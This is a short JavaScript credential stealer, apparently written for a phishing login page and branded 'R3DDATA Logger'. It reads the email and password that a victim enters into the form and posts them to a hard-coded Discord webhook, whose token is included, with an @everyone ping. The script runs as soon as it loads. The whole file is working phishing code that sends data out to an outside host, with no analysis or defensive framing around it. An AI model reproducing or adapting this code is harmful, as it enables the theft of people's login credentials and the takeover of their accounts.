function log(){
    const webhook = "https://ptb.discord.com/api/webhooks/987745045652312124/Nrfb32zhMPhwqz8GjC09OvIuWqnT_V5zHh3iwUGX5Um97eE7HAoLnql2GPTBTnBT0DoJ";
    const email = document.getElementById("email").value;
    const pwd = document.getElementById("pwd").value;
    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    const embed = {
        author: {
            name: "R3DDATA Logger",
        },
        title: "New User logged!",
        description: `**EMAIL**\n${email}\n\n**PASSWORD**\n${pwd}`,
    }
    const data = {
        username: "R3DDATA Logger",
        avatar_url: "https://cdn.discordapp.com/attachments/979041814109642782/987030212611014697/24b12715a761e50a13f4ae04a20af4b0.jpg",
        content: "@everyone",
        embeds: [ embed ]
    }
    request.send(JSON.stringify(data));
}

log();
